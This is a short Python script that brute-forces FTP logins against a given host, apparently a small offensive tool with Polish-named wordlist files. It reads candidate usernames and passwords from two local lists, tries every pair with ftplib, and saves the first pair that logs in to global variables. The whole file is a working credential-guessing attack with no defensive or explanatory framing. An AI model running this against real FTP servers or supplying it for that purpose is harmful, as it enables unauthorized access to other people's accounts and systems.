import ftplib

global FoundIDF,FoundPassF

def connect(host, user, passwd):
    global FoundIDF, FoundPassF
    FoundIDF = ""
    FoundPassF = ""
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user, passwd)
        ftp.quit()
        FoundIDF = user
        FoundPassF = passwd
        return True
    except:
        return False


def Main(host):
    result = False
    with open("Bazy/BazaID1.txt", 'r') as a, open("Bazy/BazaHa1.txt", 'r') as b:
            for line1 in a:
                if result == False:
                    user = line1.strip('\r\n')
                    b.seek(0)
                for line in b:
                    if result == False:
                        passwd = line.strip('\r\n')
                        result = connect(host, user, passwd)

#script done